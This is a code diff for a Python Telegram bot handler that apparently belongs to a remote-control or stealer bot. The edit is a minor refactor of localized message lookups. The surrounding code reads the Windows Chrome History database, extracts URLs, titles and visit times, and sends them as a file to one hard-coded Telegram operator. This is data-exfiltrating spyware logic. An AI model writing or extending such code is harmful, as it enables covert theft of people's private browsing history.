@@ -35,19 +35,18 @@ def register_chrome_history_handlers(dp):
     async def cmd_start(message: types.Message):
         user_id = message.from_user.id
         lang = user_languages.get(user_id, 'en')
-        texts = TEXTS[lang]
 
         if user_id != ALLOWED_USER_ID:
-            await message.answer(texts.get("access_denied", "Access denied."))
+            await message.answer(TEXTS[lang]['access_denied'])
             return
 
-        await message.answer(texts.get("chrome_history_start", "Getting Chrome history. Please wait..."))
+        await message.answer(TEXTS[lang]['chrome_history_start'])
 
         def get_chrome_history():
             history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
 
             if not os.path.exists(history_path):
-                return False, texts.get("chrome_history_not_found", "Chrome history file not found. Is Chrome installed?")
+                return False, TEXTS[lang]['chrome_history_not_found']
 
             temp_history_path = 'temp_history'
             shutil.copy2(history_path, temp_history_path)
@@ -75,13 +74,13 @@ def register_chrome_history_handlers(dp):
                         last_visit_time = last_visit_time / 1000000 - 11644473600
                         last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                     else:
-                        last_visit_time = texts.get("invalid_time", "Invalid time")
+                        last_visit_time = TEXTS[lang]['invalid_time']
                 except (OSError, ValueError) as e:
-                    last_visit_time = f'{texts.get("error_time", "Error")}: {str(e)}'
+                    last_visit_time = f"{TEXTS[lang]['error_time']}: {str(e)}"
 
                 text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"
 
-            file_path = os.path.join(directory, texts.get("chrome_history_filename", "Chrome_History.txt"))
+            file_path = os.path.join(directory, TEXTS[lang]['chrome_history_filename'])
 
             with open(file_path, 'w', encoding='utf-8') as file:
                 file.write(text_to_save)
@@ -100,7 +99,7 @@ def register_chrome_history_handlers(dp):
         file_path = result
         try:
             file_to_send = FSInputFile(file_path)
-            await message.answer_document(document=file_to_send, caption=texts.get("chrome_history_caption", "Here is your Chrome history, root!"))
+            await message.answer_document(document=file_to_send, caption=TEXTS[lang]['chrome_history_caption'])
         except Exception as e:
-            await message.answer(f"{texts.get('chrome_history_send_error', 'Error sending file')}: {e}")
+            await message.answer(f"{TEXTS[lang]['chrome_history_send_error']}: {e}")
         os.remove(file_path)
